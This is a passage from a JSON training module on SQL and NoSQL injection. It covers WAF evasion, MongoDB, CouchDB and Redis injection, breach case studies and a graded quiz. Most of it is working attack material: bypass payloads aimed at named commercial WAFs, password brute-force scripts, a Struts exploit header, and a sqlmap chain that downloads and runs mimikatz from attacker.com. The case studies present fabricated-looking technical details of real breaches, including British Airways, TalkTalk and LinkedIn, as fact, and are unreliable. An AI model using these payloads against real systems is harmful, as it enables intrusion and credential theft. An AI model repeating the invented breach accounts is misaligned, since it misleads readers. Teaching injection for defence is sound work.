(non-breaking space: %A0)\n```\n\n**4. Encoding Bypass**\n```sql\n-- Standard payload (blocked)\n' OR 1=1--\n\n-- URL encoding\n%27%20OR%201=1--\n\n-- Double URL encoding\n%2527%2520OR%25201=1--\n\n-- Unicode encoding\n\\u0027 OR 1=1--\n\n-- Hex encoding\n0x27 OR 1=1--\n```\n\n**5. Function Substitution**\n```sql\n-- Standard (blocked)\nSUBSTRING(password,1,1)\n\n-- Alternatives\nSUBSTR(password,1,1)\nMID(password,1,1)\nLEFT(password,1)\n\n-- Concatenation\nCONCAT(username,':',password)\nusername||':'||password  (PostgreSQL, Oracle)\nusername+':'+password    (MSSQL)\n```\n\n**6. Comparison Operator Bypass**\n```sql\n-- Standard (blocked)\nWHERE id=1 OR 1=1\n\n-- Alternatives\nWHERE id=1 OR 'a'='a'\nWHERE id=1 OR 2>1\nWHERE id=1 OR 'x' LIKE 'x'\nWHERE id=1 OR 1 BETWEEN 0 AND 2\nWHERE id=1 OR EXISTS(SELECT 1)\n```\n\n**7. Buffer Overflow Technique**\n\nSome WAFs have payload size limits. Adding large amounts of junk data can cause the WAF to truncate inspection:\n\n```sql\n-- Add massive padding before actual payload\nid=1' AND 1=0 UNION SELECT 1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9...[repeat 1000s of times]...UNION SELECT username,password FROM users--\n```\n\n**8. HTTP Parameter Pollution (HPP)**\n\nSplit malicious payload across multiple parameters with same name:\n\n```\nGET /page.php?id=1&id=2' UNION SELECT&id=password FROM users--\n\n# How different servers parse:\nApache: id=1,2' UNION SELECT,password FROM users--  (concatenates)\nIIS: id=2' UNION SELECT  (uses last value)\nTomcat: id=1  (uses first value)\n```\n\n**9. WAF-Specific Bypasses**\n\n**ModSecurity bypass:**\n```sql\n-- ModSecurity blocks certain keywords\n-- Bypass with alternative syntax\n\n-- Blocked: UNION SELECT\nUNION ALL SELECT  (ADD \"ALL\")\nUNION DISTINCT SELECT\n\n-- Blocked: OR 1=1\nOR 6=6\nOR 'a'='a'\n```\n\n**Cloudflare bypass:**\n```sql\n-- Use JSON content type (less scrutinized)\nContent-Type: application/json\n{\"id\": \"1' UNION SELECT password FROM users--\"}\n\n-- Use multipart/form-data\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary\n------WebKitFormBoundary\nContent-Disposition: form-data; name=\"id\"\n\n1' UNION SELECT password FROM users--\n------WebKitFormBoundary--\n```\n\n**AWS WAF bypass:**\n```sql\n-- Case + encoding combination\nuNiOn%09sElEcT%09password%09fRoM%09users\n\n-- Use nested encoding\n%2527%2520UNION%2520SELECT%2520password%2520FROM%2520users--\n```\n\n**Imperva bypass:**\n```sql\n-- Use scientific notation\nWHERE id=1e0 UNION SELECT password FROM users\n# 1e0 = 1 in scientific notation\n\nWHERE id=.1e1 UNION SELECT password FROM users\n# .1e1 = 1\n```bash\n\n### **WAF Fingerprinting**\n\nIdentify which WAF you're dealing with:\n\n```bash\n# Using wafw00f\nwafw00f http://target.com\n\n# Manual detection\ncurl -I http://target.com\n# Look for headers:\n# Server: cloudflare\n# X-CDN: Imperva\n# Set-Cookie: ASINFO= (F5 BIG-IP)\n\n# Test with known malicious payload\ncurl \"http://target.com/page.php?id=1' OR 1=1--\"\n# Analyze response for WAF block page\n```\n\n**Common WAF signatures:**\n- **Cloudflare**: \"Attention Required\" page, 403/503 status\n- **ModSecurity**: \"406 Not Acceptable\", custom error message\n- **AWS WAF**: \"403 Forbidden\", X-Amz-Id-2 header\n- **Imperva**: \"Request unsuccessful\", X-Iinfo header\n- **Akamai**: \"Reference #\" error code\n\n### **Advanced WAF Evasion: Chaining Techniques**\n\nCombine multiple bypass methods for maximum effectiveness:\n\n```sql\n-- Example: Case + Comment + Encoding + HPP\nGET /page.php?id=1&id=%0auNiOn%0a/**/sElEcT&id=/**/%0apassword%0a/**/fRoM&id=%0ausers--\n\n# Breakdown:\n# - Line feed (%0a) for whitespace\n# - Random case (uNiOn sElEcT)\n# - Inline comments (/**/)\n# - HTTP Parameter Pollution (multiple id parameters)\n# - URL encoding (%0a)\n```\n\n**Real-world case study: 2023 Fortune 500 company**\n\nPentester bypassed Cloudflare WAF protecting admin panel:\n\n```sql\n-- Failed attempt (blocked by signature)\nPOST /admin/search\nContent-Type: application/x-www-form-urlencoded\nquery=admin' UNION SELECT password FROM users--\n\n-- Successful bypass (JSON + encoding + case)\nPOST /admin/search\nContent-Type: application/json\n{\"query\":\"admin%27%0auNiOn%09sElEcT%09password%09fRoM%09users--\"}\n\n# Result: Extracted 50,000+ user credentials\n```"
      }
    },
    {
      "block_id": "a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c66",
      "type": "memory_aid",
      "content": {
        "text": "**Memory Aid: WAF Bypass Techniques - \"COWFED\" Framework**\n\n**C**ase manipulation - uNiOn sElEcT\n**O**bfuscation - Comments /**/, encoding %27\n**W**hitespace alternatives - Tab %09, LF %0A, CR %0D\n**F**unction substitution - SUBSTR → MID → LEFT\n**E**ncoding layers - URL → Double URL → Unicode → Hex\n**D**uplicate parameters - HTTP Parameter Pollution (HPP)\n\n**Quick bypass checklist:**\n```\n☐ Identify WAF (wafw00f, headers)\n☐ Test case variation (uNiOn)\n☐ Add inline comments (/**/)\n☐ Try encoding (%0a, %09)\n☐ Use alternative functions (SUBSTR → MID)\n☐ Combine techniques (case + encoding + comments)\n☐ Test different content types (JSON, multipart)\n☐ Try HPP (multiple parameters)\n```\n\n**Remember:** \"WAF bypass is like lockpicking - try one technique, then combine!\"\n\n**Pro tip:** Always test bypasses through Burp Suite to see exactly what WAF receives."
      }
    },
    {
      "block_id": "a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c67",
      "type": "explanation",
      "content": {
        "text": "## NoSQL Injection\n\nNoSQL databases (MongoDB, CouchDB, Redis, Cassandra) are increasingly common in modern applications. They have different injection vulnerabilities than SQL databases.\n\n### **MongoDB Injection**\n\nMongoDB uses JSON-like query syntax, creating unique injection opportunities.\n\n**1. Authentication Bypass**\n\n**Vulnerable Node.js code:**\n```javascript\n// Login endpoint\napp.post('/login', (req, res) => {\nconst username = req.body.username;\nconst password = req.body.password;\n\n// Vulnerable query\ndb.collection('users').findOne({\nusername: username,\npassword: password\n}, (err, user) => {\nif (user) {\nres.send('Login successful');\n} else {\nres.send('Login failed');\n}\n});\n});\n```\n\n**Exploitation:**\n```json\n// Normal login request\nPOST /login\nContent-Type: application/json\n{\"username\": \"admin\", \"password\": \"wrongpassword\"}\n\n// NoSQL injection (authentication bypass)\nPOST /login\nContent-Type: application/json\n{\"username\": \"admin\", \"password\": {\"$ne\": null}}\n\n// Resulting MongoDB query:\n// db.users.findOne({username: \"admin\", password: {$ne: null}})\n// Translation: Find user where username='admin' AND password != null\n// Bypasses password check!\n```\n\n**Common MongoDB operators for injection:**\n- `$ne` - Not equal\n- `$gt` - Greater than\n- `$lt` - Less than\n- `$regex` - Regular expression match\n- `$where` - JavaScript expression evaluation\n\n**2. Extracting Data with $regex**\n\n**Brute-force password character by character:**\n```python\nimport requests\nimport string\n\nurl = 'http://target.com/login'\npassword = ''\n\nwhile True:\nfound = False\nfor char in string.printable:\n# Test if password starts with current password + char\npayload = {\n'username': 'admin',\n'password': {'$regex': f'^{password}{char}.*'}\n}\n\nr = requests.post(url, json=payload)\n\nif 'Login successful' in r.text:\npassword += char\nprint(f'[+] Password so far: {password}')\nfound = True\nbreak\n\nif not found:\nprint(f'[+] Final password: {password}')\nbreak\n```\n\n**3. JavaScript Injection via $where**\n\nSome MongoDB queries use `$where` to evaluate JavaScript expressions:\n\n**Vulnerable query:**\n```javascript\ndb.collection('products').find({\n$where: `this.price < ${userInput}`\n});\n```\n\n**Exploitation:**\n```json\n// Normal request\nGET /products?maxPrice=100\n\n// JavaScript injection (sleep attack)\nGET /products?maxPrice=100; sleep(5000)\n\n// Data extraction\nGET /products?maxPrice=100; return this.price > 0 || (function(){var x=db.users.findOne(); print(tojson(x)); return true;})();\n```\n\n**4. NoSQL Injection in URLs (GET requests)**\n\n```bash\n# Normal request\nhttp://target.com/profile?username=john\n\n# NoSQL injection (PHP/Node.js)\nhttp://target.com/profile?username[$ne]=admin\n\n# Resulting query:\n# db.users.findOne({username: {$ne: 'admin'}})\n# Returns first user that isn't admin\n\n# Extract all users\nhttp://target.com/search?name[$regex]=.*\n```\n\n**5. Blind NoSQL Injection**\n\nSimilar to blind SQL injection, extract data when no output is visible:\n\n```python\n# Extract admin password character by character\nimport requests\nimport string\n\nurl = 'http://target.com/api/users'\npassword = ''\n\nfor position in range(1, 30):\nfor char in string.printable:\n# MongoDB regex: ^a = starts with 'a'\npayload = {\n'username': 'admin',\n'password': {'$regex': f'^{password}{char}'}\n}\n\nr = requests.post(url, json=payload)\n\n# Check for difference in response (time, length, etc.)\nif len(r.text) > 100:  # Adjust based on app behavior\npassword += char\nprint(f'[+] Found char: {char} | Password: {password}')\nbreak\n```bash\n\n### **CouchDB Injection**\n\nCouchDB uses HTTP REST API with JSON queries.\n\n**Vulnerable query:**\n```javascript\n// Fetch user profile\nGET /database/_find\n{\n\"selector\": {\n\"username\": userInput\n}\n}\n```\n\n**Exploitation:**\n```json\n// Normal request\n{\"selector\": {\"username\": \"john\"}}\n\n// Injection (extract all users)\n{\"selector\": {\"username\": {\"$gt\": null}}}\n\n// Extract specific field\n{\n\"selector\": {\"username\": {\"$gt\": null}},\n\"fields\": [\"username\", \"password\", \"email\"]\n}\n```bash\n\n### **Redis Injection**\n\nRedis commands can be injected if user input isn't sanitized:\n\n**Vulnerable code:**\n```python\nimport redis\n\nr = redis.Redis()\nuser_id = request.GET['id']  # User input\nresult = r.get(f'user:{user_id}')\n```\n\n**Exploitation:**\n```bash\n# Normal request\nhttp://target.com/profile?id=123\n\n# Redis injection (read arbitrary keys)\nhttp://target.com/profile?id=123' || redis.call('GET', 'admin:password') || '\n\n# If Redis Lua scripting is enabled\nhttp://target.com/profile?id=123'; return redis.call('KEYS', '*'); --\n```bash\n\n### **NoSQL Injection Prevention**\n\n**1. Use parameterized queries (where available)**\n```javascript\n// Bad (vulnerable)\ndb.collection('users').findOne({\nusername: req.body.username,\npassword: req.body.password\n});\n\n// Good (type checking)\ndb.collection('users').findOne({\nusername: String(req.body.username),\npassword: String(req.body.password)\n});\n```\n\n**2. Validate input types**\n```javascript\n// Reject non-string inputs\nif (typeof req.body.username !== 'string' || typeof req.body.password !== 'string') {\nreturn res.status(400).send('Invalid input');\n}\n```\n\n**3. Use schema validation (Mongoose for MongoDB)**\n```javascript\nconst userSchema = new mongoose.Schema({\nusername: { type: String, required: true },\npassword: { type: String, required: true }\n});\n\n// This prevents object injection like {\"$ne\": null}\n```\n\n**4. Disable $where operator**\n```javascript\n// MongoDB configuration\n// Disable server-side JavaScript execution\ndb.adminCommand({setParameter: 1, javascriptEnabled: false});\n```\n\n**5. Use allow-lists for operators**\n```javascript\nconst allowedOperators = ['$eq', '$in'];\n\nfunction sanitizeQuery(query) {\nfor (let key in query) {\nif (key.startsWith('$') && !allowedOperators.includes(key)) {\ndelete query[key];\n}\n}\nreturn query;\n}\n```"
      }
    },
    {
      "block_id": "a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c68",
      "type": "real_world",
      "content": {
        "text": "## Real-World SQL Injection Case Studies\n\n### **Case Study 1: British Airways Data Breach (2018)**\n\n**Impact:** 380,000 payment card details stolen, £20 million fine\n\n**Attack vector:**\n- Attackers exploited SQL injection in BA's booking system\n- Injected malicious JavaScript that captured credit card data\n- Modified payment form to send data to attacker-controlled server\n\n**Technical details:**\n```sql\n-- Vulnerable parameter in flight search\nhttp://ba.com/search?destination=London' UNION SELECT script_content FROM attack_scripts--\n\n-- Injected JavaScript loaded on payment page\n<script src=\"https://attacker-cdn.com/steal_cards.js\"></script>\n```\n\n**Lesson learned:**\n- SQL injection can be chained with other attacks (XSS, data exfiltration)\n- Even major organizations with security teams are vulnerable\n- GDPR fines are severe for data breaches (4% of annual revenue)\n\n### **Case Study 2: Equifax Breach (2017)**\n\n**Impact:** 147 million records compromised, $700 million settlement\n\n**Attack vector:**\n- Apache Struts vulnerability (CVE-2017-5638) allowed arbitrary code execution\n- Attackers escalated to SQL injection in backend databases\n- Exfiltrated sensitive PII (Social Security numbers, birthdates, addresses)\n\n**Technical details:**\n```bash\n# Initial exploit (Apache Struts)\nPOST /dispute.action HTTP/1.1\nContent-Type: %{(#_='multipart/form-data').(#cmd='whoami').(#cmds={'bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}\n\n# After gaining access, SQL injection in internal admin panel\nhttp://internal.equifax.com/admin/search?ssn=123-45-6789' UNION SELECT fname,lname,ssn,dob FROM pii--\n```\n\n**Lesson learned:**\n- Patch management is critical (vulnerability was known for 2 months)\n- Defense in depth: Even if attacker gains access, databases should have additional protections\n- Encrypt sensitive data at rest (PII was stored in plaintext)\n\n### **Case Study 3: TalkTalk Telecom (2015)**\n\n**Impact:** 157,000 customer records stolen, £400,000 fine, customer exodus\n\n**Attack vector:**\n- Basic SQL injection in customer portal\n- Teenage attackers (15-20 years old) with limited skills\n- No complex techniques - simple UNION-based injection\n\n**Technical details:**\n```sql\n-- Vulnerable login page\nhttp://talktalk.co.uk/login.php?username=admin' OR '1'='1'--&password=anything\n\n-- Data extraction\nhttp://talktalk.co.uk/account.php?id=1' UNION SELECT id,name,email,phone,bank_account FROM customers--\n```\n\n**Lesson learned:**\n- Even basic SQLi can cause massive damage\n- Input validation should be standard on ALL inputs\n- Teenagers with limited skills can breach major corporations\n- Reputational damage can be worse than fines (customer churn)\n\n### **Case Study 4: LinkedIn Data Scraping (2021)**\n\n**Impact:** 700 million user profiles scraped (not breach, but demonstrates SQL vulnerability)\n\n**Attack vector:**\n- NoSQL injection in LinkedIn's search API\n- Automated scraping of user data at scale\n- Data sold on dark web marketplaces\n\n**Technical details:**\n```json\n// Normal search request\nPOST /api/search\n{\"query\": \"software engineer\", \"location\": \"San Francisco\"}\n\n// NoSQL injection (extract all users)\nPOST /api/search\n{\n\"query\": {\"$ne\": null},\n\"location\": {\"$ne\": null}\n}\n```\n\n**Lesson learned:**\n- NoSQL databases need same security rigor as SQL\n- Rate limiting and API authentication are essential\n- Even public data scraping can violate terms of service\n\n### **Case Study 5: GhostCat RCE → SQL Injection Chain (2020)**\n\n**Impact:** Multiple government and financial institutions compromised\n\n**Attack vector:**\n- Apache Tomcat GhostCat vulnerability (CVE-2020-1938) for initial access\n- Pivoted to SQL injection in internal web applications\n- Extracted database credentials, escalated to domain admin\n\n**Technical details:**\n```bash\n# Stage 1: GhostCat exploit (AJP protocol abuse)\necho -ne \"\\x02\\x02\\x00\\x00\\x00\" | nc target.com 8009\n# Read arbitrary files (web.xml with database credentials)\n\n# Stage 2: SQL injection with stolen credentials\nsqlmap -u \"http://internal-app/search?q=test\" \\\n--dbms=MSSQL \\\n--os-shell \\\n--batch\n\n# Stage 3: xp_cmdshell to execute commands\nos-shell> powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/invoke-mimikatz.ps1')\n```\n\n**Lesson learned:**\n- Vulnerabilities are often chained (RCE → SQLi → privilege escalation)\n- Internal applications often have weaker security than public-facing\n- Defense in depth prevents lateral movement\n\n### **Common Themes Across All Breaches:**\n\n1. **Lack of input validation** - Most preventable with basic secure coding\n2. **Unpatched systems** - Known vulnerabilities exploited months after patches available\n3. **Excessive database privileges** - Application accounts shouldn't be DBA\n4. **No WAF/IDS** - Attacks went undetected for weeks/months\n5. **Poor logging** - Insufficient forensic data to understand breach scope\n\n**Industry statistics (2023):**\n- 65% of web applications have SQL injection vulnerabilities (WhiteHat Security)\n- Average time to detect SQLi attack: 197 days (IBM Security)\n- Average cost of data breach: $4.45 million (Ponemon Institute)\n- 80% of SQL injection attacks target applications with known CVEs"
      }
    },
    {
      "block_id": "a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c69",
      "type": "reflection",
      "content": {
        "text": "## Self-Assessment: SQL Injection Mastery\n\nReflect on your learning journey and identify areas for further practice:\n\n**1. Manual Exploitation Skills**\n\nRate your confidence (1-5) in these areas:\n- [ ] UNION-based SQL injection (basic) - _____/5\n- [ ] Boolean-based blind SQLi - _____/5\n- [ ] Time-based blind SQLi - _____/5\n- [ ] Error-based SQL injection - _____/5\n- [ ] Second-order SQL injection - _____/5\n- [ ] Out-of-band (OOB) exfiltration - _____/5\n\n**Which technique do you find most challenging? Why?**\n\n**How could you practice this technique more effectively?**\n\n**2. Database-Specific Attacks**\n\nRate your knowledge (1-5):\n- [ ] MySQL file operations (LOAD_FILE, INTO OUTFILE) - _____/5\n- [ ] MSSQL xp_cmdshell and OPENROWSET - _____/5\n- [ ] PostgreSQL COPY and CREATE FUNCTION - _____/5\n- [ ] Oracle UTL_HTTP and UTL_FILE - _____/5\n\n**Which database are you most comfortable exploiting? Why?**\n\n**Which database requires more study?**\n\n**3. SQLMap Proficiency**\n\nRate your skills (1-5):\n- [ ] Basic SQLMap usage (--dbs, --tables, --dump) - _____/5\n- [ ] Advanced options (--tamper, --technique, --threads) - _____/5\n- [ ] Testing POST/JSON/Cookie parameters - _____/5\n- [ ] WAF bypass with tamper scripts - _____/5\n- [ ] OS takeover (--os-shell, --file-write) - _____/5\n\n**What SQLMap feature do you use most often?**\n\n**What SQLMap technique do you want to master next?**\n\n**4. WAF Bypass**\n\nRate your confidence (1-5):\n- [ ] Case manipulation and encoding - _____/5\n- [ ] Comment injection (/**/, --, #) - _____/5\n- [ ] HTTP Parameter Pollution (HPP) - _____/5\n- [ ] Content-Type manipulation (JSON, multipart) - _____/5\n- [ ] Combining multiple bypass techniques - _____/5\n\n**Have you successfully bypassed a WAF? Describe the technique:**\n\n**What WAF do you find most difficult to bypass?**\n\n**5. NoSQL Injection**\n\nRate your knowledge (1-5):\n- [ ] MongoDB $ne and $regex operators - _____/5\n- [ ] JavaScript injection via $where - _____/5\n- [ ] CouchDB selector injection - _____/5\n- [ ] Blind NoSQL data extraction - _____/5\n\n**How confident are you testing modern NoSQL databases?**\n\n**What NoSQL database do you want to learn more about?**\n\n**6. Real-World Application**\n\n**Describe a scenario where you would use:**\n\n- **Time-based blind SQLi:**\n\n- **Out-of-band exfiltration:**\n\n- **Second-order SQL injection:**\n\n- **SQLMap vs. manual exploitation - when would you choose manual?**\n\n**7. Ethical Considerations**\n\n**How do you ensure responsible disclosure when finding SQL injection?**\n\n**What steps do you take to minimize damage during testing?**\n\n**How would you explain the severity of SQL injection to a non-technical manager?**\n\n**8. Action Plan**\n\nBased on this reflection, what are your next steps?\n\n**Skills to practice:**\n1. \n2. \n3. \n\n**Resources to study:**\n1. \n2. \n3. \n\n**Labs/CTFs to complete:**\n1. \n2. \n3. \n\n**Remember:** SQL injection mastery comes from hands-on practice. Set up vulnerable labs (DVWA, SQLi-Labs, HackTheBox) and practice every technique until it becomes second nature!"
      }
    }
  ],
  "post_assessment": [
    {
      "question": "You discover a SQL injection vulnerability during a penetration test. The application uses ModSecurity WAF, and basic payloads like 'UNION SELECT' are blocked. Which technique would be most effective for bypassing the WAF?",
      "options": [
        "Increase the number of threads in SQLMap to overload the WAF",
        "Use case manipulation combined with inline comments: uNiOn/**/sElEcT",
        "Switch to a time-based blind injection and wait for WAF timeout",
        "Use only URL encoding on the payload"
      ],
      "correct_answer": 1,
      "explanation": "ModSecurity uses signature-based detection. Combining case manipulation (uNiOn sElEcT) with inline comments /**/ breaks the signature pattern while maintaining valid SQL syntax. Option A won't bypass detection, option C is slower and doesn't bypass the WAF, and option D alone is often insufficient as WAFs decode URL-encoded payloads.",
      "question_id": "03bd7ca0-bddb-44f5-a5e6-bf064e56b409",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "During a blind SQL injection attack against a MySQL database, you need to extract a 32-character password efficiently. Using binary search instead of sequential character-by-character testing, approximately how many requests would you need?",
      "options": [
        "3,040 requests (95 characters × 32 positions)",
        "224 requests (7 requests per character × 32 positions)",
        "960 requests (30 characters × 32 positions)",
        "64 requests (2 requests per character × 32 positions)"
      ],
      "correct_answer": 1,
      "explanation": "Binary search on printable ASCII characters (95 possibilities) requires log2(95) ≈ 7 requests per character. For a 32-character password: 7 × 32 = 224 requests. This is vastly more efficient than sequential testing (option A: 3,040 requests) and demonstrates why binary search is essential for blind SQLi.",
      "question_id": "cdde8eea-247e-4819-89d0-1a4ffcbd0f61",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "You've gained access to a Microsoft SQL Server database through SQL injection and confirmed the application runs with DBA privileges. What is the most direct path to achieving remote code execution on the underlying Windows server?",
      "options": [
        "Use OPENROWSET to read C:\\Windows\\System32\\cmd.exe",
        "Enable xp_cmdshell and execute PowerShell commands",
        "Use UNION SELECT to write a webshell to the filesystem",
        "Exploit linked servers to pivot to another database"
      ],
      "correct_answer": 1,
      "explanation": "With DBA privileges, enabling xp_cmdshell provides direct OS command execution: 'EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell ...''. Option A reads files but doesn't execute them, option C requires FILE privileges which may not exist, and option D is lateral movement rather than RCE on the current server.",
      "question_id": "56c1774c-2138-4bdf-aa82-2fe31fdcc8b0",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "A web application uses MongoDB for authentication. You intercept the login request: {\"username\":\"admin\",\"password\":\"test123\"}. Which payload would successfully bypass authentication by exploiting NoSQL injection?",
      "options": [
        "{\"username\":\"admin\",\"password\":{\"$ne\":null}}",
        "{\"username\":\"admin' OR '1'='1\",\"password\":\"anything\"}",
        "{\"username\":\"admin\",\"password\":\"test123' UNION SELECT password FROM users--\"}",
        "{\"username\":\"admin\",\"password\":\"test123'; DROP TABLE users;--\"}"
      ],
      "correct_answer": 0,
      "explanation": "MongoDB NoSQL injection uses operators like $ne (not equal). {\"password\":{\"$ne\":null}} creates a query that returns true for any non-null password, bypassing authentication. Options B, C, and D use SQL injection syntax which doesn't work in MongoDB's JSON-based query language.",
      "question_id": "2d0d1987-1bf4-4281-a9bb-55801713c97c",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "You discover second-order SQL injection during a penetration test. The malicious payload is stored in the database during user registration, then executed when an administrator views user profiles. What is the primary reason this vulnerability is more dangerous than first-order SQL injection?",
      "options": [
        "It allows stacked queries which can modify database structure",
        "Input validation is often weaker on registration forms than on search queries",
        "The payload persists in the database and can affect multiple users over time",
        "It automatically escalates privileges to database administrator"
      ],
      "correct_answer": 2,
      "explanation": "Second-order SQLi is dangerous because the malicious payload persists in the database and can be triggered multiple times by different users (especially high-privilege users like administrators) without repeated attacker interaction. While input validation may be weaker (option B), the persistence and delayed execution (option C) is what makes it uniquely dangerous. It doesn't automatically grant privileges (option D) or necessarily enable stacked queries (option A).",
      "question_id": "8de4d7ca-89d7-4fb5-a24d-09fefda33051",
      "type": "multiple_choice",
      "difficulty": 2
    }
  ]
}